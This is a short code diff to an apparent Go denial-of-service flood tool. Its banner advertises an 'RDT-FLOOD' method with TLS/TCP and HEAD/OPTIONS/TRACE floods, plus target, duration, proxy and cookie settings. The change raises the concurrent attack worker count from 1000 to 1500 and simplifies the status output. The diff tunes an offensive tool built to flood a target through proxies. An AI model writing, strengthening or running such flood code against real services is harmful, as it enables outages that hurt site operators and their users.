@@ -22,7 +22,7 @@ import (
 )
 
 const (
-	wrk         = 1000
+	wrk         = 1500
 	to          = 5 * time.Second
 	sub         = 2
 	KEEP_ALIVE  = 60 * time.Second
@@ -678,11 +678,11 @@ func main() {
 		}
 		wcs[i] = CLI{client: client, ip: ip}
 	}
-	fmt.Printf("ޗ | Method : RDT-FLOOD + TLS/TCP + HEAD/OPTIONS/TRACE\n")
+	fmt.Printf("ޗ | Method : RDT-FLOOD\n")
 	fmt.Printf("ޗ | Target : %s\n", tgt)
 	fmt.Printf("ޗ | Time   : %d seconds\n", dur)
 	fmt.Printf("ޗ | Proxy  : %d\n", len(proxies))
-	fmt.Printf("ޗ | Conc   : %d (HTTP), %d (TLS), %d (TCP)\n", wrk, TLS_WORKERS, TCP_WORKERS)
+	fmt.Printf("ޗ | Conc   : %d | %d | %d |\n", wrk, TLS_WORKERS, TCP_WORKERS)
 	if customCookie != "" {
 		fmt.Printf("ޗ | Cookie : %s\n", customCookie[:30])
 	} else {
